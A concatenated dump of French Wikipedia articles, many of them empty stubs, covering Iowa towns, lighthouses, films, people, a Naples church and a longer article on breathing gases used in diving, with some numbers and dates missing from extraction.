Rembrandt est une ville du comté de Buena Vista, en Iowa, aux États-Unis. La ville est incorporée le . 
Carte interactive.
&lt;mapframe zoom=12 latitude =42.826389 longitude =-95.165833 align=center width=250 height=250 text="Carte interactive de Rembrandt"&gt; { "type": "ExternalData", "service": "geoshape", "ids": "Q990960", "properties": { "fill": "#fc3", "stroke": "#ac6600" } } &lt;/mapframe&gt;

</doc>
<doc id="10577397" url="https://fr.wikipedia.org/wiki?curid=10577397" title="Ho voglia di te">
Ho voglia di te



</doc>
<doc id="10577401" url="https://fr.wikipedia.org/wiki?curid=10577401" title="Aéroport de Gällivare">
Aéroport de Gällivare



</doc>
<doc id="10577406" url="https://fr.wikipedia.org/wiki?curid=10577406" title="Aéroport d'Arvidsjaur">
Aéroport d'Arvidsjaur



</doc>
<doc id="10577432" url="https://fr.wikipedia.org/wiki?curid=10577432" title="Truesdale (Iowa)">
Truesdale (Iowa)

Truesdale est une ville du comté de Buena Vista, en Iowa, aux États-Unis. La ville est incorporée le .
&lt;mapframe zoom=13 latitude =42.728611 longitude =-95.183056 align=right width=250 height=250 text="Carte interactive de Truesdale"&gt; { "type": "ExternalData", "service": "geoshape", "ids": "Q2239886", "properties": { "fill": "#fc3", "stroke": "#ac6600" } } &lt;/mapframe&gt;

</doc>
<doc id="10577436" url="https://fr.wikipedia.org/wiki?curid=10577436" title="Greenville (Delaware)">
Greenville (Delaware)

 est une census-designated place située dans le comté de New Castle, dans l’État du Delaware. En 2010, sa population est de .
La communauté abrite la résidence privée de Joe Biden, l’actuel président des États-Unis, et des descendants de la famille Du Pont.
&lt;mapframe zoom=14 latitude =39.775 longitude =-75.5966 align=left width=250 height=250 text="Carte interactive de Greenville"&gt; { "type": "ExternalData", "service": "geoshape", "ids": "Q755754", "properties": { "fill": "#fc3", "stroke": "#ac6600" } } &lt;/mapframe&gt;

</doc>
<doc id="10577441" url="https://fr.wikipedia.org/wiki?curid=10577441" title="Sparassus boiei">
Sparassus boiei



</doc>
<doc id="10577442" url="https://fr.wikipedia.org/wiki?curid=10577442" title="Heteropoda flavimana">
Heteropoda flavimana



</doc>
<doc id="10577443" url="https://fr.wikipedia.org/wiki?curid=10577443" title="Adrastis atomaria">
Adrastis atomaria



</doc>
<doc id="10577456" url="https://fr.wikipedia.org/wiki?curid=10577456" title="Henri chabert">
Henri chabert



</doc>
<doc id="10577480" url="https://fr.wikipedia.org/wiki?curid=10577480" title="Greenville (Maine)">
Greenville (Maine)

 est une ville américaine située dans le comté de Piscataquis dans l’État du Maine. Selon le recensement de 2020, sa population est de .
&lt;mapframe zoom=11 latitude =45.45944 longitude =-69.590556 align=left width=250 height=250 text="Carte interactive de Greenville"&gt; { "type": "ExternalData", "service": "geoshape", "ids": "Q3448547", "properties": { "fill": "#fc3", "stroke": "#ac6600" } } &lt;/mapframe&gt;
La ville est centrée sur l’extrémité inférieure du Lac de Moosehead, le plus grand plan d’eau douce de l’État du Maine

</doc>
<doc id="10577481" url="https://fr.wikipedia.org/wiki?curid=10577481" title="Jeanne-Élisabeth de Holstein-Gottorp">
Jeanne-Élisabeth de Holstein-Gottorp

Jeanne-Élisabeth de Holstein-Gottorp (en ), née le au château de Gottorf et morte le à Paris, est une princesse allemande, régente de la principauté d'Anhalt-Zerbst de 1747 à 1752. Épouse du prince Christian-Auguste d'Anhalt-Zerbst elle est célèbre en tant que mère de Catherine II de Russie et sœur du roi Adolphe-Frédéric de Suède.
Union et postérité.
Fille du prince Christian-Auguste de Holstein-Gottorp et de la princesse Albertine-Frédérique de Bade-Durlach, Jeanne-Élisabeth est la plus jeune fille survivante du couple. Le elle épouse à Vechelde Christian-Auguste d'Anhalt-Zerbst. Ils ont cinq enfants:

</doc>
<doc id="10577485" url="https://fr.wikipedia.org/wiki?curid=10577485" title="Aéroport de Vilhelmina">
Aéroport de Vilhelmina



</doc>
<doc id="10577487" url="https://fr.wikipedia.org/wiki?curid=10577487" title="Club des 33">
Club des 33

Le Club des « 33 » est un club gastronomique belge fondé en 1933. Celui-ci cultive l’art de vivre, dans l’assiette autant qu’autour de la table.
Il a pour objet .
Outre 33 membres titulaires, numérotés de 1 à 33 par ordre d’ancienneté, le Club compte également des membres d’honneur, des membres perpétuels et des membres stagiaires, tous recrutés par cooptation, en fonction de critères d’intérêt gastronomique et d’art de vivre. Les membres titulaires sont recrutés parmi les membres stagiaires ayant réussi un examen gastronomique et œnologique.
Le Club se réunit 20 fois par an, 10 fois lors d’un déjeuner et 10 fois lors d’un dîner. Chaque réunion est organisée par un membre qui en cette circonstance, porte le titre de « brigadier ». Le brigadier assume la responsabilité de choisir un restaurant, de composer un menu et de le présenter en justifiant ou expliquant son choix.
Ce club est le pendant belge du Club des Cent. Diverses personnalités belges comme Raymond Vaxelaire, Paul-Émile Janson, Eugène Flagey et Adolphe Max en ont été les présidents.

</doc>
<doc id="10577491" url="https://fr.wikipedia.org/wiki?curid=10577491" title="Attentat-suicide du 1er juin 2015 à Samarra">
Attentat-suicide du 1er juin 2015 à Samarra



</doc>
<doc id="10577493" url="https://fr.wikipedia.org/wiki?curid=10577493" title="Truesdale">
Truesdale

Lakeside peut se rapporter à :

</doc>
<doc id="10577510" url="https://fr.wikipedia.org/wiki?curid=10577510" title="Strahlkopf">
Strahlkopf

Le est une montagne qui s’élève à d’altitude dans les Alpes d'Allgäu, en Autriche.

</doc>
<doc id="10577516" url="https://fr.wikipedia.org/wiki?curid=10577516" title="Schwarwald-Stadion">
Schwarwald-Stadion



</doc>
<doc id="10577523" url="https://fr.wikipedia.org/wiki?curid=10577523" title="Décharge de classe 1">
Décharge de classe 1



</doc>
<doc id="10577524" url="https://fr.wikipedia.org/wiki?curid=10577524" title="Phare d'Arranmore">
Phare d'Arranmore

Le phare d'Arranmore est un phare situé sur l'Île d'Arranmore au large des côtes du Comté de Donegal (Irlande). Il est géré par les Commissioners of Irish Lights (CIL).
Histoire.
&lt;mapframe zoom=16 latitude =55.015 longitude =-8.561 align=left width=250 height=250 text="Carte interactive du phare d'Arranmore"&gt;{
 "type": "FeatureCollection",
 "features": [
 "type": "Feature",
 "properties": {
 "marker-color": "#ff8040",
 "marker-size": "medium",
 "marker-symbol": "lighthouse"
 "geometry": {
 "type": "Point",
 "coordinates": [
 -8.561,
 55.015
 ]
}&lt;/mapframe&gt;
La première station avait été établie en 1798 et elle est devenue inactive en 1832. Elle a été démolie pour fournir des matériaux de construction pour la nouvelle tour, à la mise en service du phare de Tory Island.
Le phare actuel a été érigé au nord-ouest de l'île d'Arranmore en 1865, il est identique à celui de Rathlin O'Birne. La tour ronde en pierre mesure , avec lanterne et galerie, est peinte en blanc. Sa lanterne possède une lentille de Fresnel de troisième ordre depuis 1953. Une maison de gardien de 2 étages se trouve à côté. Il a été électrifié en 1949, d'abord avec deux moteurs Lister alimentant des générateurs puis définitivement sur le réseau de l'île en 1970. Le phare est devenu entièrement automatique en 1976 et le gardien a déménagé dans le village.
Dominant le niveau de la mer de , il émet deux flashs blancs séparés de 4 secondes toutes les 20 secondes. Un feu auxiliaire, à une élévation de , émet un flash rouge toutes les 3 secondes en direction nord-ouest vers les rochers "Stags Rocks".
L'île d'Arranmore, à au large du petit port de Burtonport, est accessible en ferry. Le phare est situé à au nord-ouest du seul village de l'île, Leabgarrow, où se trouve l'agent de maintenance de l'installation. La maison du gardien est inoccupée et le phare ne se visite pas.

</doc>
<doc id="10577525" url="https://fr.wikipedia.org/wiki?curid=10577525" title="Rothornspitze">
Rothornspitze

La est une montagne qui s’élève à d’altitude dans les Alpes d'Allgäu, en Autriche.

</doc>
<doc id="10577532" url="https://fr.wikipedia.org/wiki?curid=10577532" title="Centre de stockage des déchets dangereux">
Centre de stockage des déchets dangereux



</doc>
<doc id="10577533" url="https://fr.wikipedia.org/wiki?curid=10577533" title="Installations de stockage de déchets dangereux">
Installations de stockage de déchets dangereux



</doc>
<doc id="10577538" url="https://fr.wikipedia.org/wiki?curid=10577538" title="Anna Pinnock">
Anna Pinnock

Anna Joyce Pinnock est une chef décoratrice britannique née en .
Elle est principalement connue pour ses décors sur les films "L'Odyssée de Pi" (2012), "The Grand Budapest Hotel" (2014) et la série de films "Les Animaux fantastiques" (depuis 2016).
Elle remporte l'Oscar des meilleurs décors ainsi qu'un BAFTA Award en 2015 pour le film "The Grand Budapest Hotel", et un BAFTA Award pour son travail sur le premier film des "Animaux fantastiques" en 2017.
Biographie.
C'est la sœur du chef d'orchestre et claveciniste britannique Trevor Pinnock. Elle travaille d'abord comme décoratrice pour la comédie britannique "Quatre Mariages et un enterrement" en 1994. Sa première nomination pour les meilleurs décors aux Oscars, avec , date de 2002 pour "Gosford Park". Aux Oscars 2008, elle est à nouveau nommée dans la même catégorie, cette fois avec Dennis Gassner, pour le film "". Elle reçoit sa troisième nomination aux Oscars en 2013 avec David Gropmanpour pour son travail sur le drame d'aventure "L'Odyssée de Pi", sorti 2012. La même année, elle travaille comme décoratrice pour le thriller d'espionnage britannique "Skyfall". 
En 2015, elle remporte l'Oscar des meilleurs décors avec Adam Stockhausen pour son travail sur "The Grand Budapest Hotel", en étant également nommée dans la même catégorie, avec Dennis Gassner, pour "Into the Woods". Une autre nomination aux Oscars a suivi en 2017 pour son travail sur "Les Animaux fantastiques", en 2016.
Elle est à la tête depuis de "Anna Pinnock Decoration Limited".

</doc>
<doc id="10577553" url="https://fr.wikipedia.org/wiki?curid=10577553" title="Daniel Carney">
Daniel Carney

Daniel Carney (8 août 1944 - 9 janvier 1987) est un romancier rhodésien d'origine britannique. Trois de ses romans ont été adaptés au cinéma. Il est le frère d'Erin Pizzey, une écrivaine et militante pour les droits des femmes britannique.
Biographie.
Daniel Carney, fils de diplomate britannique, est né à Beyrouth en 1944. En 1963, il s'installe en Rhodésie et rejoint la British South Africa Police, où il a servi pendant trois ans et demi. En 1968, il a co-fondé la société immobilière Fox et Carney à Harare. Il meurt d'un cancer en 1987.

</doc>
<doc id="10577559" url="https://fr.wikipedia.org/wiki?curid=10577559" title="Équipe cycliste Roubaix Métropole européenne de Lille">
Équipe cycliste Roubaix Métropole européenne de Lille



</doc>
<doc id="10577565" url="https://fr.wikipedia.org/wiki?curid=10577565" title="Héritage français dans la région de Pittsburgh">
Héritage français dans la région de Pittsburgh



</doc>
<doc id="10577571" url="https://fr.wikipedia.org/wiki?curid=10577571" title="Leabgarrow">
Leabgarrow

Leabgarrow (en irlandais : An Leadhb Gharbh) est un village gaeltacht, le seul de l'île d'Arranmore, du comté de Donegal. Il est desservi par le ferry de la ville de Burtonport se situant à de l'île.
Le village possède un bureau de poste, un collège d'enseignement général et le port du ferry. Leabgarrow possède aussi un restaurant, une salle de jeux et de nombreux pubs et des bars servant essentiellement au tourisme local et journalier.

</doc>
<doc id="10577575" url="https://fr.wikipedia.org/wiki?curid=10577575" title="Plan régional d'élimination des déchets industriels et spéciaux">
Plan régional d'élimination des déchets industriels et spéciaux



</doc>
<doc id="10577581" url="https://fr.wikipedia.org/wiki?curid=10577581" title="Un amour de sable">
Un amour de sable

Un amour de sable est un film français réalisé par Christian Lara et sorti en 1977.
Synopsis.
Angela se croit coupable d'un accident de voiture dans lequel son mari et sa maîtresse ont trouvé la mort. Elle est en traitement pour dépression puis en convalescence à Belle-Ile-en-Mer où elle fait la connaissance d'un vétérinaire, intrigué par Angela, qui finit par en tomber amoureux.

</doc>
<doc id="10577584" url="https://fr.wikipedia.org/wiki?curid=10577584" title="Aéroport d'Hemavan Tärnaby">
Aéroport d'Hemavan Tärnaby



</doc>
<doc id="10577598" url="https://fr.wikipedia.org/wiki?curid=10577598" title="Ancco">
Ancco

Ancco (en ), de son vrai nom : Choi Kyung-jin (en ) est une autrice de bande dessinée sud-coréenne née le à Seongnam, ville proche de Séoul, Corée du Sud.
Biographie.
Troisième fille d'une famille de quatre enfants, Ancco se fait connaître en 2002-2003 en publiant son journal en dessins sur internet, qui sera ensuite édité en album. Son premier ouvrage publié en France est "Jindol et moi" aux Éditions Philippe Picquier en 2007. En 2009, elle livre "Aujourd'hui n'existe pas" (éd. Cornélius). "Mauvaises filles", paru en France en 2016 (Cornélius), met en scène deux jeunes filles fragiles qui, à la fin des années 1990 en Corée, échouent dans un bar à hôtesses. L'album reçoit le Prix Révélation au Festival d'Angoulême 2017 et le Korean Comics Today prize. 

</doc>
<doc id="10577600" url="https://fr.wikipedia.org/wiki?curid=10577600" title="Fleur de tonnerre (film)">
Fleur de tonnerre (film)

Fleur de tonnerre est un film dramatique franco-belge coécrit et réalisé par Stéphanie Pillonca-Kervern, sorti en 2017. Il s'agit de l'adaptation du roman du même nom de Jean Teulé (2013).
Il relate la biographie romancée d'Hélène Jégado, surnommée « Fleur de tonnerre » par sa mère. Employée pendant des années comme cuisinière en Basse-Bretagne au début du , se prenant pour l'incarnation de l'Ankou, personnage mythique de la mort, elle tue ses employeurs successifs en empoisonnant leur nourriture avec de la mort aux rats.
Synopsis.
En Basse-Bretagne, Hélène Jégado est une enfant isolée, surnommée « Fleur de tonnerre » par sa mère. Enfant, elle est terrorisée par l'Ankou, personnage mythique de la mort. Après la mort de sa mère, Hélène devient domestique. Pour surmonter sa peur, elle décide d’être l'incarnation de l'Ankou. Hélène va devenir la plus prolifique tueuse en série française.
Production.
Tournage.
Le tournage a lieu en cinq semaines en Bretagne, essentiellement dans les ruelles de Moncontour, mais aussi à la chapelle Saint-Gildas de Bieuzy, à l'écomusée de Brec'h, à la citadelle de Port-Louis, au cap d'Erquy…
Accueil.
Accueil critique.
En France, le site Allociné propose une note moyenne de à partir de l'interprétation de critiques provenant de de presse.
Box-office.
"Fleur de tonnerre" accueille .

</doc>
<doc id="10577601" url="https://fr.wikipedia.org/wiki?curid=10577601" title="Fleur de tonnerre">
Fleur de tonnerre

Fleur de tonnerre peut désigner :

</doc>
<doc id="10577604" url="https://fr.wikipedia.org/wiki?curid=10577604" title="Groupe A de la Copa América Centenario">
Groupe A de la Copa América Centenario

Le groupe A de le Copa América Centenario, qui se dispute aux États-Unis du 3 juin au , comprend quatre équipes dont les deux premières se qualifient pour les quarts de finale de la compétition.
Le tirage au sort est effectué le à New York.
Les États-Unis, première de ce groupe, affronte le deuxième du groupe B, l'Équateur et la Colombie, deuxième, le premier du groupe B, le Pérou.
Buteurs et passeurs.
Le Colombien James Rodríguez termine meilleur buteur du groupe A en compagnie de l'Américain Clint Dempsey.
L'Américain Clint Dempsey termine meilleur passeur du groupe A en compagnie du Colombien Edwin Cardona.

</doc>
<doc id="10577605" url="https://fr.wikipedia.org/wiki?curid=10577605" title="ISDND">
ISDND



</doc>
<doc id="10577611" url="https://fr.wikipedia.org/wiki?curid=10577611" title="ISDD">
ISDD



</doc>
<doc id="10577612" url="https://fr.wikipedia.org/wiki?curid=10577612" title="J'avais dix-neuf ans">
J'avais dix-neuf ans



</doc>
<doc id="10577620" url="https://fr.wikipedia.org/wiki?curid=10577620" title="Rue Urbain-IV">
Rue Urbain-IV

La rue Urbain-IV est une voie située à Troyes, dans le département français de l'Aube
Situation et accès.
Cette voie va de la place de la Libération à la place Audiffred dans le « Bouchon de Champagne », cœur historique de la ville de Troyes.
Origine du nom.
Cette rue honore le pape Urbain IV. Né fils de savetier à Troyes, Jacques Pantaléon fut archidiacre à Fosses-la ville, évêque de Verdun, patriarche de Jérusalem avant d'être élu pape en 1261, gouvernant l'Eglise sous le nom d'Urbain IV.
Historique.
La Rue Moyenne, ancienne rue Urbain IV.

</doc>
<doc id="10577624" url="https://fr.wikipedia.org/wiki?curid=10577624" title="Masmughans du Dumavand">
Masmughans du Dumavand

Les Masmughans de Damavand (Moyen-perse : Masmughan-i Dumbawand, persan : مس مغان دماوند, "Great Magians of Damavand") étaient une dynastie locale, qui a régné dans la région de Damavand et de ses environs à partir de 651 jusqu'à 760 après J-C. Le fondateur de cette dynastie était un Karenid appelé .

</doc>
<doc id="10577633" url="https://fr.wikipedia.org/wiki?curid=10577633" title="Jack Strong">
Jack Strong



</doc>
<doc id="10577643" url="https://fr.wikipedia.org/wiki?curid=10577643" title="James FitzGerald, 1er duc de Leinster">
James FitzGerald, 1er duc de Leinster



</doc>
<doc id="10577647" url="https://fr.wikipedia.org/wiki?curid=10577647" title="Discographie de Ratt">
Discographie de Ratt

Cet article présente la discographie du groupe américain Ratt.

</doc>
<doc id="10577650" url="https://fr.wikipedia.org/wiki?curid=10577650" title="Équipe cycliste Crelan-Vastgoedservice">
Équipe cycliste Crelan-Vastgoedservice



</doc>
<doc id="10577659" url="https://fr.wikipedia.org/wiki?curid=10577659" title="Jaroslav Navratil">
Jaroslav Navratil



</doc>
<doc id="10577676" url="https://fr.wikipedia.org/wiki?curid=10577676" title="Remerton">
Remerton

La ville de est située dans le comté de Lowndes, dans l’État de Géorgie, aux États-Unis. Sa population s’élevait à lors du recensement.
Démographie.
 

</doc>
<doc id="10577682" url="https://fr.wikipedia.org/wiki?curid=10577682" title="Stéphanie Pillonca-Kervern">
Stéphanie Pillonca-Kervern

Stéphanie Pillonca, ou Stéphanie Pillonca-Kervern depuis son mariage, née en 1971, est une réalisatrice, scénariste et actrice française.
Biographie.
Stéphanie Marie Pillonca naît à La Farlède, dans le Var.
Après avoir étudié la comédie au conservatoire à rayonnement régional de Toulon, Stéphanie Pillonca-Kervern suit la formation de La Classe Libre du Cours Florent.
Entre 1998 et 2000, elle collabore à l'émission people "Exclusif" en tant que chroniqueuse, aux côtés d'Emmanuelle Gaume et Frédéric Joly. En 2001, elle travaille à la "Star Academy", notamment lors du prime où elle fait visiter le château.
Elle réalise en 2011 son premier court métrage, intitulé "Bocuse", qui met en scène une empoisonneuse interprétée par Anémone). Elle reprend ce thème en 2017 dans son premier long métrage intitulé "Fleur de tonnerre", adaptation du roman homonyme de Jean Teulé qu'elle coécrit avec Gustave Kervern. Les rôles principaux sont interprétés par Déborah François et Benjamin Biolay.
Elle réalise également plusieurs documentaires et téléfilms.
Vie privée.
Elle est mariée avec l'acteur et réalisateur Gustave Kervern.

</doc>
<doc id="10577685" url="https://fr.wikipedia.org/wiki?curid=10577685" title="Stéphanie Pillonca">
Stéphanie Pillonca



</doc>
<doc id="10577692" url="https://fr.wikipedia.org/wiki?curid=10577692" title="Zoo de Pretoria">
Zoo de Pretoria

Le zoo de Pretoria (connu officiellement sous le nom de "National Zoological Gardens of South Africa", « jardin zoologique national d'Afrique du Sud »), est un parc zoologique national situé à Pretoria, la capitale administrative de l'Afrique du Sud.
Fondé par le zoologiste sud-africain Jan Willem Boudewijn Gunning en 1899, il est l'un des huit plus grands parcs zoologiques au monde.

</doc>
<doc id="10577694" url="https://fr.wikipedia.org/wiki?curid=10577694" title="Église San Severo al Pendino">
Église San Severo al Pendino

L'église San Severo al Pendino est une église monumentale de Naples, aujourd'hui déconsacrée et utilisée comme espace d'expositions. Elle donne via Duomo. Elle est dédiée à l'évêque saint Sévère ("Severus") de Naples.
Histoire.
L'église est fondée en 1448 avec un hospice attenant par Pietro Caracciolo, abbé de l'église voisine San Giorgio Maggiore; son nom d'origine est "Santa Maria a Selice". 
En 1550, l'église est concédée aux dominicains qui acquièrent en 1587 le Palazzo Como à côté pour s'en servir comme couvent. Entre 1599 et 1620, l'église d'origine est démolie et une autre est construite selon les dessins de , dans le goût maniériste tardif.
Elle est remaniée dans la première moitié du XVIIIe siècle en style baroque. Elle est caractérisée par un escalier remarquable avec une balustrade finement sculptée en piperno. 
En 1818, l'édifice déconsacré sert de premier siège des Archives d'État, puis avec le retour des religieux, l'ensemble est refait en 1845 par Filippo Botta; cependant en 1863, nombre de congrégations sont dissoutes et les religieux en sont donc expulsés. La partie postérieure de l'édifice devient le "Ritiro dell'Ecce Homo". 
Avec les travaux de la nouvelle via Duomo, l'église est privée de sa façade baroque et de ses deux premières chapelles latérales, tandis que la nef se retrouve raccourcie. Une nouvelle façade néo-renaissance est rapidement construite. Pendant la Seconde Guerre mondiale, l'église est utilisée comme abri anti-aérien. Elle est endommagée par le tremblement de terre de 1980 qui ravage une grande partie des édifices baroques de Naples et elle est fermée au public . 
À la fin du , l'église est restaurée et retrouve son antique splendeur et la structure de son architecture originelle grâce à la surintendance des biens architecturaux.
L'église est déconsacrée et sert maintenant de lieu d'expositions.
Description.
L'édifice présente une façade simple néo-renaissance de la fin du avec un portail simple flanqué de deux niches et surmonté d'une rosace.
L'intérieur s'inscrit dans une croix grecque avec seulement deux chapelles. Sa décoration date du , adaptée à une structure de la fin du . Le maître-autel de marbres polychromes date du . On remarque dans le transept de droite le splendide tombeau de Giovanni Alfonso Bisvallo, sculpté par en 1617 ; il devait certainement accueillir aussi un tableau de Luca Giordano.

</doc>
<doc id="10577707" url="https://fr.wikipedia.org/wiki?curid=10577707" title="Makapuʻu">
Makapuʻu

Makapuʻu est la pointe orientale de l'île d'Oahu à Hawaï. Elle comprend le reste d'une crête qui s'élève à au-dessus du niveau de la mer.
Description.
Son point le plus au sud est une falaise où est établi un phare. Le nom du lieu signifie en hawaïen et dériverait d'une grotte nommée "Keanaokeakuapōloli". Lieu pittoresque exposant une vue panoramique importante, le site est célèbre pour :

</doc>
<doc id="10577713" url="https://fr.wikipedia.org/wiki?curid=10577713" title="Aire d'État de Makapuu Point">
Aire d'État de Makapuu Point



</doc>
<doc id="10577715" url="https://fr.wikipedia.org/wiki?curid=10577715" title="Gaz respiratoire">
Gaz respiratoire

Un gaz respirable est un mélange d'éléments chimiques gazeux et de composés utilisés pour la respiration.
L'air est le gaz respiratoire le plus courant et naturel, mais une gamme de gaz purs ou de mélanges de gaz sont utilisés dans les équipements de respiration et les habitats clos comme l'équipement de plongée sous-marine, l'équipement de plongée fourni par la surface, les chambres de recompression, les sous-marins, les costumes spatiaux, les engins spatiaux, le support médical de la vie et l'équipement de premiers soins, l'alpinisme de haute altitude et les machines d'anesthésie.
L'oxygène est la composante essentielle pour tout gaz respiratoire, à une pression partielle entre environ 0,16 et à la pression ambiante. L'oxygène est habituellement le seul composant métaboliquement actif à moins que le gaz soit un mélange anesthésique. Une partie de l'oxygène dans le gaz respiratoire est consommée par les processus métaboliques, et les composants inertes sont inchangés, et servent principalement à diluer l'oxygène à une concentration appropriée, et sont donc également connus sous le nom de gaz diluant. La plupart des gaz respiratoires sont donc un mélange d'oxygène et d'un ou plusieurs gaz inertes. D'autres gaz respiratoires ont été développés pour améliorer la performance de l'air ordinaire en réduisant le risque de maladie de décompression, en réduisant la durée des arrêts de décompression, en réduisant la narcose à l'azote ou en permettant les plongées profondes plus sûres.
Un gaz respiratoire sûr pour l'utilisation hyperbare a trois caractéristiques essentielles :
Les techniques utilisées pour remplir les bouteilles de plongée avec des gaz autres que l'air sont appelées mélange gazeux .
Les gaz de respiration utilisés à des pressions ambiantes inférieures à la pression atmosphérique normale sont habituellement enrichis en air avec de l'oxygène pour fournir suffisamment d'oxygène pour maintenir la vie et la conscience, ou pour permettre des niveaux d'effort plus élevés que ce qui serait possible en utilisant de l'air. Il est fréquent de fournir de l'oxygène supplémentaire en tant que gaz pur ajouté à l'air respiré lors de l'inhalation, ou bien si un système de support de vie.
Gaz respiratoires en plongée.
Ces gaz respiratoires communs en plongée communs sont utilisés :
Composants individuels des gaz respiratoires.
Oxygène.
L'oxygène () doit être présent dans chaque gaz respiratoire. C'est parce qu'il est essentiel au processus métabolique du corps humain, qui soutient la vie. Le corps humain ne peut stocker l'oxygène pour une utilisation ultérieure comme il le fait avec la nourriture. Si le corps est privé d'oxygène pendant plus de quelques minutes, cela peut provoquer l'inconscience et la mort. Les tissus et organes du corps (notamment le cœur et le cerveau) sont endommagés s'ils sont privés d'oxygène pendant plus de quatre minutes.
Remplir une bouteille de plongée avec de l'oxygène pur coûte environ cinq fois plus que de le remplir d'air comprimé. Comme l'oxygène favorise la combustion et provoque la rouille dans les bouteilles de plongée, il doit être manipulé avec précaution lors du mélange de gaz.
L'oxygène a été historiquement obtenu par distillation fractionnée de l'air liquide, mais il est de plus en plus obtenu par des technologies non cryogéniques telles que l'adsorption par inversion de pression (PSA ou "Pressure Swing Adsorption") et l'adsorption par oscillation sous vide (VPSA ou "Vacuum Pressure Swing Adsorption").
Fraction de l'oxygène.
La fraction de la composante oxygène d'un mélange de gaz respiratoire est parfois utilisée pour nommer le mélange :
La fraction de l'oxygène détermine la plus grande profondeur à laquelle le mélange peut être utilisé en toute sécurité pour éviter la toxicité de l'oxygène. Cette profondeur est appelée profondeur maximum d'utilisation.
Pression partielle de l'oxygène.
La concentration d'oxygène dans un mélange gazeux dépend de la fraction et de la pression du mélange. Il est exprimé par la pression partielle d'oxygène (ppO2).
La pression partielle de tout gaz composant dans un mélange est calculée comme suit :
Pour la composante oxygène,
PpO² = P × FO² 
où: 
PpO² = pression partielle d'oxygène 
P = pression totale 
FO² = fraction volumique de la teneur en oxygène 
La pression partielle minimale d'oxygène dans un gaz respiratoire est généralement de (). En dessous de cette pression partielle, le plongeur risque de perdre connaissance et de mourir en raison de l'hypoxie, en fonction de facteurs tels que la physiologie individuelle et le niveau d'effort. Lorsqu'un mélange hypoxique est insufflé dans l'eau peu profonde, il peut ne pas avoir une PpO² suffisamment élevée pour garder le plongeur conscient. Pour cette raison, les «gaz de voyage» (travel gaz) normoxiques ou hyperoxiques sont utilisés à une profondeur moyenne entre les phases « de fond » et « de décompression » de la plongée.
Le maximum de sécurité PpO² dans un gaz respiratoire dépend du temps d'exposition, du niveau d'exercice et de la sécurité de l'équipement respiratoire utilisé. Il est typiquement entre (1 bar) et (1,6 bar). Pour les plongées de moins de trois heures, il est communément considéré comme étant de 140 kPa (1,4 bar), bien que l'US Navy ait été autorisé à plonger avec une PpO² de (1,8 bar). Pour des expositions élevées de PpO² ou plus, le plongeur risque de présenter une toxicité à l'oxygène qui peut entraîner une crise. Chaque gaz respirable a une profondeur de fonctionnement maximale qui est déterminée par sa teneur en oxygène. Pour la recompression thérapeutique et l'oxygénothérapie hyperbare, des pressions partielles de 2,8 bars sont couramment utilisées dans la chambre, mais il n'y a pas de risque de noyade si l'occupant perd conscience.
Les analyseurs d'oxygène sont utilisés pour mesurer la PpO² dans le mélange de gaz.
Divox.
« Divox » est l'oxygène. Aux Pays-Bas, l'oxygène pur pour la respiration est considéré comme un médicament par opposition à l'oxygène industriel, comme celui utilisé dans la soudure, et est uniquement disponible sur prescription médicale. L'industrie de la plongée a enregistré le Divox comme marque de commerce pour respirer de l'oxygène de qualité pour contourner les règles strictes concernant l'oxygène médicinal, ce qui rend plus facile pour les plongeurs (récréatifs) d'obtenir de l'oxygène pour mélanger leur gaz respiratoire. Dans la plupart des pays, il n'y a aucune différence de pureté dans l'oxygène médical et l'oxygène industriel, car ils sont produits par exactement les mêmes méthodes et fabricants, mais étiquetés et embouteillés différemment. La principale différence entre eux est que la piste de garde papier est beaucoup plus étendue pour l'oxygène médical, afin d'identifier plus facilement la trace de fabrication exacte d'un « lot » ou d'un lot d'oxygène, au cas où des problèmes de pureté seraient découverts. L'oxygène de qualité aviation est semblable à l'oxygène médical, mais peut avoir une teneur en humidité plus faible.
Azote.
L'azote (N2) est un gaz diatomique et la principale composante de l'air, le gaz respiratoire le moins cher et le plus commun utilisé pour la plongée. Il cause la narcose à l'azote dans le plongeur, ainsi son utilisation est limitée aux plongées moins profondes. L'azote peut causer la maladie de décompression.
La profondeur équivalente air est utilisée pour estimer les besoins de décompression d'un mélange nitrox (oxygène/azote).
La profondeur narcotique équivalente est utilisée pour estimer la puissance narcotique du trimix (mélange oxygène/hélium/azote). Beaucoup de plongeurs constatent que le niveau de la narcose causée par une plongée de 30 m, tout en respirant l'air, est un maximum confortable.
L'azote dans un mélange de gaz est presque toujours obtenu en ajoutant de l'air au mélange.
Hélium.
L'hélium (He) est un gaz inerte qui est moins narcotique que l'azote à pression équivalente (en fait il n'y a aucune preuve de narcose de l'hélium du tout), il est donc plus approprié pour les plongées plus profondes que l'azote. L'hélium est également capable de causer la maladie de décompression. À des pressions élevées, l'hélium provoque également le syndrome nerveux des hautes pressions, qui est un syndrome d'irritation du système nerveux central qui est en quelque sorte opposé à la narcose.
Les remplissages d'hélium coûtent généralement dix fois plus qu'un remplissage d'air équivalent.
L'hélium n'est pas très approprié pour l'inflation de la combinaison sèche en raison de ses mauvaises propriétés d'isolation thermique — l'hélium est un très bon conducteur de la chaleur (par rapport à l'air). La faible masse molaire de l'hélium (, comparée au diazote () et au dioxygène () augmente le timbre de la voix du plongeur, ce qui peut entraver la communication. Cela est dû au fait que la vitesse du son est plus rapide dans un gaz de poids moléculaire inférieur, ce qui augmente la fréquence de résonance des cordes vocales. L'hélium s'échappe plus facilement des vannes endommagées ou défectueuses que les autres gaz, car les atomes d'hélium sont plus petits, ce qui leur permet de traverser de plus petites fentes dans les joints.
L'hélium ne se trouve en quantités significatives que dans le gaz naturel, d'où il est extrait à basse température par distillation fractionnée.
Néon.
Le néon (Ne) est un gaz inerte parfois utilisé dans la plongée commerciale profonde mais qui est très coûteux. Comme l'hélium, il est moins narcotique que l'azote, mais contrairement à l'hélium, il ne déforme pas la voix du plongeur.
Hydrogène.
L'hydrogène (H2) a été utilisé dans les mélanges de gaz de plongée profonde, mais il est très explosif lorsqu'il est mélangé avec plus de 4 à 5 % d'oxygène (tel que l'oxygène dans le gaz respiratoire). Cela limite l'utilisation de l'hydrogène dans les plongées profondes et impose des protocoles compliqués pour s'assurer que l'excès d'oxygène est éliminé de l'équipement respiratoire avant que l'hydrogène ne commence à être respirer. Comme l'hélium, il élève le timbre de la voix du plongeur. Le mélange d'hydrogène et d'oxygène lorsqu'il est utilisé comme gaz de plongée est parfois appelé Hydrox. Des mélanges contenant à la fois l'hydrogène et l'hélium comme diluants sont appelés Hydreliox.
Composants indésirables des gaz respiratoires.
De nombreux gaz ne sont pas appropriés pour l'utilisation dans les gaz respiratoires de plongée.
